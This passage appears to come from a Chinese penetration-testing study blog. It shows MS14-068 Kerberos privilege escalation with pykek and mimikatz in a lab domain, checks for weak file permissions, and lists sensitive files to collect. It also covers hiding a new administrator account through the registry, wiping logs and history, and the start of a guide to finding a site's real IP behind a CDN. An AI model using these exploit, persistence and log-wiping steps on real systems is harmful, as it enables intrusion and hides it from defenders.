<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 首先在 kali 通过脚本生成一个票据文件</span><br><span class="line">	# ms14<span class="number">-068.</span>py -u <span class="symbol">user@</span>lab.com -s userSID -d dc.lab.com</span><br><span class="line">	-u 用户名:登录用户名</span><br><span class="line">	-s userSID</span><br><span class="line">	-d 域控制器名称：在 Win7 计算机名称处查看，不在域控是，可以用IP地址代替</span><br><span class="line"><span class="number">2.</span> 将票据文件拷贝到 win 系统里</span><br><span class="line">	# 拷贝 <span class="symbol">TGT_user1@</span>lab.com.ccache 到windows系统</span><br><span class="line"><span class="number">3.</span> 在 win 系统里使用 mimikatz.exe 完成权限的提升</span><br><span class="line">	# mimikatz.exe log <span class="string">"kerberos::ptc TGT_user@lab.com.ccache"</span> exit</span><br><span class="line">  </span><br><span class="line"># 在 Win7 上使用本地用户登录</span><br><span class="line"># 查看域账号的信息</span><br><span class="line">C:\&gt;net user</span><br><span class="line">	\\WIN7-VM 的用户帐户</span><br><span class="line">	Administrator            Guest                    John</span><br><span class="line">	user1                    user2</span><br><span class="line">	命令成功完成。</span><br><span class="line">C:\Win32&gt;whoami.exe /all</span><br><span class="line">	[User]     = <span class="string">"LAB\user3"</span>  S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3056505427</span><span class="number">-3800332898</span><span class="number">-2304591883</span><span class="number">-1111</span></span><br><span class="line"></span><br><span class="line"># kali 报错缺少模块</span><br><span class="line"><span class="symbol">root@</span>kali:~# python <span class="number">35474.</span>py -u <span class="symbol">user3@</span>lab.com -s S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3056505427</span><span class="number">-3800332898</span><span class="number">-2304591883</span><span class="number">-1111</span> -d <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span></span><br><span class="line">  </span><br><span class="line"># 下载安装模块https:<span class="comment">//github.com/bidord/pykek</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190413165535193.png" alt="在这里插入图片描述"></p>
</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~/Desktop/pykek-master# python ms14<span class="number">-068.</span>py -u <span class="symbol">user3@</span>lab.com -s S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3056505427</span><span class="number">-3800332898</span><span class="number">-2304591883</span><span class="number">-1111</span> -d <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span></span><br><span class="line">Password: </span><br><span class="line">  [+] Building AS-REQ <span class="keyword">for</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Sending AS-REQ to <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Receiving AS-REP <span class="keyword">from</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Parsing AS-REP <span class="keyword">from</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Building TGS-REQ <span class="keyword">for</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Sending TGS-REQ to <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Receiving TGS-REP <span class="keyword">from</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Parsing TGS-REP <span class="keyword">from</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Creating ccache file <span class="string">'TGT_user1@lab.com.ccache'</span>... Done		</span><br><span class="line"># 将文件拷贝到 Win7</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190413165539296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">	# 在 Win7 下执行</span><br><span class="line">	C:\mimikatz\Win32&gt;mimikatz.exe log <span class="string">"kerberos::ptc TGT_user3@lab.com.ccache"</span> exit</span><br><span class="line">![在这里插入图片描述](https:<span class="comment">//img-blog.csdnimg.cn/2019041316554383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70)</span></span><br><span class="line">	</span><br><span class="line">	# 如果injecte成功 你有可能获得到了域管理session，那么klist看一下是否有了kerberos Ticket</span><br><span class="line">	C:\mimikatz\Win32&gt;klist</span><br><span class="line">		当前登录 ID 是 <span class="number">0</span>:<span class="number">0x776bd</span></span><br><span class="line">		缓存的票证: (<span class="number">1</span>)</span><br><span class="line">		#<span class="number">0</span>&gt;     客户端: user3 @ LAB.COM</span><br><span class="line">	        服务器: krbtgt/LAB.COM @ LAB.COM</span><br><span class="line">	        Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)</span><br><span class="line">	        票证标志 <span class="number">0x50a00000</span> -&gt; forwardable proxiable renewable pre_authent</span><br><span class="line">	        开始时间: <span class="number">3</span>/<span class="number">4</span>/<span class="number">2018</span> <span class="number">2</span>:<span class="number">00</span>:<span class="number">45</span> (本地)</span><br><span class="line">	        结束时间:   <span class="number">3</span>/<span class="number">4</span>/<span class="number">2018</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">44</span> (本地)</span><br><span class="line">	        续订时间: <span class="number">3</span>/<span class="number">11</span>/<span class="number">2018</span> <span class="number">2</span>:<span class="number">00</span>:<span class="number">44</span> (本地)</span><br><span class="line">	        会话密钥类型: RSADSI RC4-HMAC(NT)</span><br><span class="line">	C:\mimikatz\Win32&gt;net use \\Win2003.lab.com\admin$</span><br><span class="line">		命令成功完成。</span><br></pre></td></tr></table></figure>

<h4 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a>利用配置不当提权</h4><ul>
<li>与漏洞提权相比更常用的方法 <ul>
<li>企业环境 </li>
<li>补丁更新的全部已经安装 </li>
<li>输入变量过滤之外更值得研发关注的安全隐患 </li>
<li>以system权限启动 </li>
<li>NTFS权限允许users修改删除 </li>
</ul>
</li>
<li>icacls<ul>
<li>icacls c:\windows*.exe /save perm /T </li>
<li>i586-mingw32msvc-gcc -o admin.exe admin.c </li>
</ul>
</li>
<li>Find<ul>
<li>find / -perm 777 -exec ls -l {} ; </li>
</ul>
</li>
<li>应用系统的配置文件 <ul>
<li>应用连接数据库的配置文件 </li>
</ul>
</li>
</ul>
<h5 id="1-NTFS权限允许-users-修改删除"><a href="#1-NTFS权限允许-users-修改删除" class="headerlink" title="1. NTFS权限允许 users 修改删除"></a>1. NTFS权限允许 users 修改删除</h5><p><img src="/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427212609.png" alt></p>
<p><img src="/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427212636.png" alt></p>
<ul>
<li>icacls 在 win2003 及以后的版本中存在，可以拷贝到 WinXP 中</li>
</ul>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">C:<span class="string">\&gt;icacls</span> boot.ini</span><br><span class="line">	boot.ini BUILTIN<span class="string">\Power</span> Users:(RX)</span><br><span class="line">	         BUILTIN<span class="string">\Administrators:(F)</span></span><br><span class="line">	         NT AUTHORITY<span class="string">\SYSTEM:(F)</span></span><br><span class="line">	</span><br><span class="line">	Successfully processed <span class="number">1</span> files; Failed processing <span class="number">0</span> files</span><br><span class="line"><span class="comment"># 如果 user 用户拥有 F（FULL）权限，则可以直接控制系统</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询各程序的权限情况</span></span><br><span class="line">C:<span class="string">\&gt;icacls</span> c:<span class="string">\windows\*.exe</span> /save saveicacls /T</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427213117.png" alt></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">BU：build user</span><br><span class="line">PU：power user</span><br><span class="line">BA：build administrator</span><br><span class="line"></span><br><span class="line">如果 BU 是 F 的话，则说明可以替换</span><br><span class="line">如果出现 FA；；；BU，则说明权限配置不当</span><br><span class="line"></span><br><span class="line"><span class="comment"># kali 下使用 c 文件生成 winXP 下的可执行程序</span></span><br><span class="line">root@kali:~# i686-w64-mingw32-gcc -o admin.exe admin.c</span><br></pre></td></tr></table></figure>

<h5 id="2-linux-下查看权限"><a href="#2-linux-下查看权限" class="headerlink" title="2.linux 下查看权限"></a>2.linux 下查看权限</h5><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">root@kali:~# <span class="keyword">ls</span> -l</span><br><span class="line">find / -perm <span class="number">777</span> -<span class="keyword">exec</span> <span class="keyword">ls</span> -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<h5 id="3-应用系统的配置文件"><a href="#3-应用系统的配置文件" class="headerlink" title="3.应用系统的配置文件"></a>3.应用系统的配置文件</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 应用连接数据库的配置文件</span><br><span class="line"><span class="number">2.</span> 后台服务运行账号</span><br></pre></td></tr></table></figure>

<h4 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h4><h5 id="1-提权之后收集基本信息"><a href="#1-提权之后收集基本信息" class="headerlink" title="1. 提权之后收集基本信息"></a>1. 提权之后收集基本信息</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Linux</span></span><br><span class="line">•/etc/resolv.conf</span><br><span class="line">•/etc/passwd</span><br><span class="line">•/etc/shadow</span><br><span class="line">•whoami <span class="keyword">and</span> who –a</span><br><span class="line">•ifconfig -a, iptables -L -n, ifconfig –a, netstat –r</span><br><span class="line">•uname –a, ps aux</span><br><span class="line">•dpkg -l| head</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">•ipconfig /all , ipconfig /displaydns, netstat -bnao , netstat –r</span><br><span class="line">•net view , net view /domain    # 查共享信息</span><br><span class="line">•net<span class="built_in"> user </span>/domain, net<span class="built_in"> user </span>%username% /domain  # 查域信息</span><br><span class="line">•net accounts, net share</span><br><span class="line">•net localgroup administrators username /add</span><br><span class="line">•net<span class="built_in"> group </span><span class="string">"Domain Controllers"</span> /domain</span><br><span class="line">•net share name$=C:\ /unlimited    # 把 C盘共享出来</span><br><span class="line">•net<span class="built_in"> user </span>username /active:yes /domain  # 域管理员重新启动被锁定账号</span><br></pre></td></tr></table></figure>

<h5 id="2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION"><a href="#2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION" class="headerlink" title="2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)"></a>2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">C:\Users\John&gt;wmic</span><br><span class="line">wmic:root\cli&gt;/?</span><br><span class="line">[global switches] &lt;command&gt;</span><br><span class="line"></span><br><span class="line">有效的全局开关有:</span><br><span class="line">/NAMESPACE           别名使用的名称空间路径。</span><br><span class="line">/ROLE                包含此别名定义的角色路径。</span><br><span class="line">/NODE                别名使用的服务器。</span><br><span class="line">/IMPLEVEL            客户模拟级别。</span><br><span class="line">/AUTHLEVEL           客户身份验证级别。</span><br><span class="line">/LOCALE              客户应用的语言识别符。</span><br><span class="line">/PRIVILEGES          启用或禁用所有特权。</span><br><span class="line">/TRACE               将调试信息输出到 stderr。</span><br><span class="line">/RECORD              将所有输入命令和输出写入日志。</span><br><span class="line">/INTERACTIVE         设置或重设交互模式。</span><br><span class="line">/FAILFAST            设置或重置 FailFast 模式。</span><br><span class="line"><span class="built_in">/USER </span>               会话期间使用的用户。</span><br><span class="line">/PASSWORD            用于会话登录的密码。</span><br><span class="line">/OUTPUT              为输出重新定向指定模式。</span><br><span class="line">/APPEND              为输出重新定向指定模式。</span><br><span class="line">/AGGREGATE           设置或重置集合模式。</span><br><span class="line">/AUTHORITY           Specifies the &lt;authority type&gt; <span class="keyword">for</span> the connection.</span><br><span class="line">/?[:&lt;BRIEF|FULL&gt;]    用法信息。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">•wmic nicconfig <span class="builtin-name">get</span> ipaddress,macaddress</span><br><span class="line">•wmic computersystem <span class="builtin-name">get</span> username</span><br><span class="line">•wmic netlogin <span class="builtin-name">get</span> name,lastlogon</span><br><span class="line">•wmic process <span class="builtin-name">get</span> caption, executablepath,commandline   # 提取软件安装信息</span><br><span class="line">•wmic process where <span class="attribute">name</span>=“calc.exe" call terminate  # 结束进程</span><br><span class="line">•wmic os <span class="builtin-name">get</span> name,servicepackmajorversion       #提取操作系统的补丁版本</span><br><span class="line">•wmic product <span class="builtin-name">get</span> name,version                  # 提取软件信息</span><br><span class="line">•wmic product where <span class="attribute">name</span>=“name” call uninstall /nointeractive   # 静默删除</span><br><span class="line">•wmic share <span class="builtin-name">get</span> /ALL                            # 提取共享文件夹</span><br><span class="line">•wmic /node:<span class="string">"machinename"</span> path Win32_TerminalServiceSetting where  <span class="attribute">AllowTSConnections</span>=<span class="string">"0"</span> call SetAllowTSConnections <span class="string">"1"</span>    # 开远程桌面</span><br><span class="line">•wmic nteventlog <span class="builtin-name">get</span> path,filename, writeable   #查看日志目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\&gt;wmic nteventlog <span class="builtin-name">get</span> path,filename, writeable</span><br><span class="line">FileName   Path                       Writeable</span><br><span class="line">appevent   \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">ntds       \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">dnsevent   \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">ntfrs      \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">secevent   \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">sysevent   \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">ThinPrint  \windows\system32\config\  <span class="literal">TRUE</span></span><br></pre></td></tr></table></figure>

<h5 id="3-收集敏感信息"><a href="#3-收集敏感信息" class="headerlink" title="3. 收集敏感信息"></a>3. 收集敏感信息</h5><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line"># Linux</span><br><span class="line">•/etc ；/usr/local/etc</span><br><span class="line">•/etc/passwd ；/etc/shadow</span><br><span class="line">•.ssh ；.gnupg 公私钥</span><br><span class="line">•The e-mail and data files</span><br><span class="line">•业务数据库 ；身份认证服务器数据库</span><br><span class="line">•/tmp</span><br><span class="line"></span><br><span class="line"># windows</span><br><span class="line">•SAM 数据库 ； 注册表文件</span><br><span class="line">•<span class="variable">%SYSTEMROOT%</span><span class="symbol">\r</span>epair<span class="symbol">\S</span>AM</span><br><span class="line">•<span class="variable">%SYSTEMROOT%</span><span class="symbol">\S</span>ystem32<span class="symbol">\c</span>onfig<span class="symbol">\R</span>egBack<span class="symbol">\S</span>AM</span><br><span class="line">•业务数据库； 身份认证数据库</span><br><span class="line">•临时文件目录</span><br><span class="line">•UserProfile<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\T</span>emporary Internet Files\</span><br></pre></td></tr></table></figure>

<h4 id="清除渗透攻击痕迹"><a href="#清除渗透攻击痕迹" class="headerlink" title="清除渗透攻击痕迹"></a>清除渗透攻击痕迹</h4><ul>
<li>最多也只是清除本地记录，如果有日志服务器的话还是会被记录下所有操作</li>
<li>windows 系统</li>
</ul>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">•禁止在登陆界面显示新建账号</span><br><span class="line">•REG ADD "HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersio<span class="symbol">\W</span>inLogon<span class="symbol">\S</span>pecialAccounts<span class="symbol">\U</span>serList" /v uname /T REG_DWORD /D 0</span><br><span class="line">•del <span class="variable">%WINDIR%</span><span class="symbol">\*</span>.log /a/s/q/f</span><br><span class="line">•History</span><br><span class="line">•日志</span><br><span class="line">•auth.log / secure</span><br><span class="line">•btmp / wtmp</span><br><span class="line">•lastlog / faillog</span><br><span class="line">•其他日志和 HIDS 等</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 控制系统之后，新建账号并添加管理员组</span><br><span class="line">C:<span class="symbol">\&gt;</span>net user user4 123456 /add</span><br><span class="line">命令成功完成。</span><br><span class="line">C:<span class="symbol">\&gt;</span>net localgroup administrators user4 /add</span><br><span class="line">命令成功完成。</span><br><span class="line"># 这样开机登录的界面会显示这个账户</span><br><span class="line"># 可以通过添加注册表来隐藏</span><br><span class="line">REG ADD "HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inLogon<span class="symbol">\S</span>pecialAccounts<span class="symbol">\U</span>serList" /v user4 /T REG_DWORD /D 0</span><br><span class="line">C:<span class="symbol">\&gt;</span>REG ADD "HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inLogon<span class="symbol">\S</span>pecialAccounts<span class="symbol">\U</span>serList" /v user4 /T REG_DWORD /D 0</span><br><span class="line">操作成功结束</span><br><span class="line"># 但是使用 net user 还是可以查看到这个账户</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 强制静默删除日志</span><br><span class="line">C:<span class="symbol">\&gt;</span>del <span class="variable">%WINDIR%</span><span class="symbol">\*</span>.log /a/s/q/f</span><br></pre></td></tr></table></figure>

<ul>
<li>Linux 系统</li>
</ul>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># history</span></span><br><span class="line"><span class="comment"># history 记录保存在 .bash_history</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ls -l .bash_history </span></span><br><span class="line">    -rw------- <span class="number">1</span> root root <span class="number">15418 3</span>月   <span class="number">4 00</span><span class="symbol">:</span><span class="number">28</span> .bash_history</span><br><span class="line"><span class="comment"># 擦除痕迹</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># history -c</span></span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># lsattr</span></span><br><span class="line">    --------------e---- ./Downloads</span><br><span class="line">    --------------e---- ./Desktop</span><br><span class="line">    --------------e---- ./testDir</span><br><span class="line">    --------------e---- ./Pictures</span><br><span class="line">    --------------e---- ./Public</span><br><span class="line">    --------------e---- ./vmware-tools-patches</span><br><span class="line">    --------------e---- ./Videos</span><br><span class="line">    --------------e---- ./Documents</span><br><span class="line">    --------------e---- ./Music</span><br><span class="line">    --------------e---- ./Templates</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># chattr -h</span></span><br><span class="line">    <span class="symbol">Usage:</span> chattr [-pRVf] [-+=aAcCdDeijPsStTu] [-v version] files...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改文件属性让其无法被写入数据</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># touch 456.txt</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># lsattr 456.txt </span></span><br><span class="line">    --------------e---- <span class="number">456</span>.txt</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ifconfig &gt; 456.txt </span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># chattr +i 456.txt </span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># lsattr 456.txt </span></span><br><span class="line">    ----i---------e---- <span class="number">456</span>.txt</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ifconfig &gt; 456.txt </span></span><br><span class="line">    -<span class="symbol">bash:</span> <span class="number">456</span>.<span class="symbol">txt:</span> 不允许的操作</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 .bash_history，让其无法被写入，会变成只读文件</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># chattr +i .bash_history</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 日志记录</span></span><br><span class="line">•auth.log / secure</span><br><span class="line">•btmp / wtmp</span><br><span class="line">•lastlog / faillog</span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /var/log/auth.log</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /var/log/wtmp</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># lastlog</span></span><br><span class="line">    用户名           端口     来自             最后登陆时间</span><br><span class="line">    root             pts/<span class="number">3</span>    <span class="number">172.16</span>.<span class="number">10.1</span>      日 <span class="number">3</span>月  <span class="number">4 02</span><span class="symbol">:</span><span class="number">30:00</span> -0500 <span class="number">2018</span></span><br><span class="line">    daemon                                     **从未登录过**</span><br><span class="line">    bin                                        **从未登录过**</span><br><span class="line">    sys                                        **从未登录过**</span><br><span class="line">    sync                                       **从未登录过**</span><br><span class="line">    games                                      **从未登录过**</span><br><span class="line">    man                                        **从未登录过**</span><br><span class="line">    lp                                         **从未登录过**</span><br><span class="line">    mail                                       **从未登录过**</span><br><span class="line">    news                                       **从未登录过**</span><br><span class="line">    uucp                                       **从未登录过**</span><br><span class="line">    proxy                                      **从未登录过**</span><br><span class="line">    www-data                                   **从未登录过**</span><br><span class="line">    backup                                     **从未登录过**</span><br><span class="line">    list                                       **从未登录过**</span><br><span class="line">    irc                                        **从未登录过**</span><br><span class="line">    gnats                                      **从未登录过**</span><br><span class="line">    nobody                                     **从未登录过**</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过CDN查找ip方法总结</title>
    <url>/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/</url>
    <content><![CDATA[<h2 id="绕过CDN查找真实IP方法总结"><a href="#绕过CDN查找真实IP方法总结" class="headerlink" title="绕过CDN查找真实IP方法总结"></a>绕过CDN查找真实IP方法总结</h2><h4 id="什么是CDN以及CDN加速？"><a href="#什么是CDN以及CDN加速？" class="headerlink" title="什么是CDN以及CDN加速？"></a>什么是CDN以及CDN加速？</h4><p><strong>(摘自百度百科）</strong></p>
<p>​        CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/内容分发网络/4034265" target="_blank" rel="noopener">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p>
<p><img src="/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/4610b912c8fcc3ce005c05d19c45d688d53f20b0%5B1%5D.png" alt></p>
<p>比较常见的基于公有云的高可用架构，即：</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">域名</span>--&gt;<span class="comment">CDN，CDN</span>--&gt;<span class="comment">WAF，WAF</span>--&gt;<span class="comment">SLB，SLB</span>--&gt;<span class="comment">ECS</span></span><br></pre></td></tr></table></figure>

<p><strong>CDN对网站有什么好处?</strong></p>
<p>​    首先，开启CDN后的网站，会根据用户所在地的不同访问CDN的节点服务器，并不直接访问源服务器，这样可以减少网站服务器宽带资源,降低服务器压力。这也就是大家都在ping百度,但是不同地区得到的反馈ip不一样的原因。</p>
<p>​    其次，由于CDN节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN其实是充当了一个替身的角色，无论服务器是渗透还是DD0S攻击，攻击的目标都将是CDN节点，这样一来便间接的保护了网站本身。</p>
<p><strong>为什么我们需要绕过CDN？</strong></p>
<pre><code>对于我们渗透测试者来说，我们在信息收集中重要的一步就是要得到目标服务器主机的**真实IP地址**，但如果目标服务器部署了CDN服务，那么往往我们直接访问得到的IP只是CDN节点服务器的IP，而不是真实的源服务器的IP地址，这是就需要我们想办法绕过CDN获取源服务器IP。</code></pre><p>下面我收集了一些常见的绕过CDN的方法，留作记录:</p>
<h4 id="验证是否存在CDN"><a href="#验证是否存在CDN" class="headerlink" title="验证是否存在CDN"></a>验证是否存在CDN</h4><h5 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h5><p>很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br> <a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br> <a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a><br> <a href="http://ce.cloud.360.cn/" target="_blank" rel="noopener">http://ce.cloud.360.cn/</a></p>
<p>我们这里打开第一个网站：ping一下<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
<p><img src="/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/QQ%E6%88%AA%E5%9B%BE20200427093341.png" alt></p>
<p>这里可以看出百度的独立IP有17个，且各个节点的返回速度存在不同的延迟。说明百度采用了CDN服务，但是ping没有办法确认真实IP。</p>
<h5 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h5><p>使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。有 CDN 的示例：</p>
<blockquote>
<p> <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a><br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p>
<p> 非权威应答:<br> 名称:    163.xdwscache.ourglb0.com<br> Addresses:  58.223.164.86</p>
<p> ​          125.75.32.252<br> Aliases:  <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a></p>
<p> ​          <a href="http://www.163.com.lxdns.com/" target="_blank" rel="noopener">www.163.com.lxdns.com</a></p>
</blockquote>
<p>无 CDN 的示例：</p>
<blockquote>
<p> xiaix.me<br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p>
<p> 非权威应答:<br> 名称:    xiaix.me<br> Address:  192.3.168.172  </p>
</blockquote>
<p>下面我收集了一些常见的绕过CDN查找真实IP的方法，留作记录:</p>
<h4 id="绕过-CDN-查找网站真实-IP"><a href="#绕过-CDN-查找网站真实-IP" class="headerlink" title="绕过 CDN 查找网站真实 IP"></a>绕过 CDN 查找网站真实 IP</h4><h5 id="1-查询历史DNS记录"><a href="#1-查询历史DNS记录" class="headerlink" title="1:查询历史DNS记录"></a>1:查询历史DNS记录</h5><p>1）查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br> <a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>     ###DNS查询<br> <a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>    ###微步在线<br> <a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a>    ###在线域名信息查询<br> <a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a>        ###DNS、IP等查询<br> <a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener">https://tools.ipip.net/cdn.php</a>  ###CDN查询IP</p>
<p>2）利用<a href="https://securitytrails.com/" target="_blank" rel="noopener">SecurityTrails</a>平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。</p>
<p>如何寻找隐藏在CloudFlare或TOR背后的真实原始IP</p>
<p><img src="/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/1058583-20181009230838766-860479177%5B1%5D.png" alt></p>
<p>除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。</p>
<p><strong>MX记录</strong></p>
